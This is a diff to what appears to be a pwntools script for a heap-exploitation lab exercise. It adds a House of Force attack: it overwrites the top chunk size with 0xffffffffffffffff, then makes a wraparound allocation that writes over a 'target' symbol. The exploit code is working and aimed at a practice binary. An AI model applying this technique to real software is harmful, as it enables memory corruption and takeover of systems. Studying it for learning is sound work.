@@ -48,11 +48,16 @@ info(f"target: 0x{elf.sym.target:02x}")
 
 # The malloc() function chooses option 1 from the menu.
 # Its arguments are "size" and "data".
-malloc(24, b"Y"*24)
+# malloc(24, b"Y"*24)
 
 # The delta() function finds the "wraparound" distance between two addresses.
-info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
+# info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
 
 # =============================================================================
+
+malloc(24, b'Y'*24 + p64(0xffffffffffffffff))
+space = delta(heap + 0x20, elf.sym.target - 0x20)
+malloc(space, b'A')
+malloc(24, b'Hello!!')
 
 io.interactive()
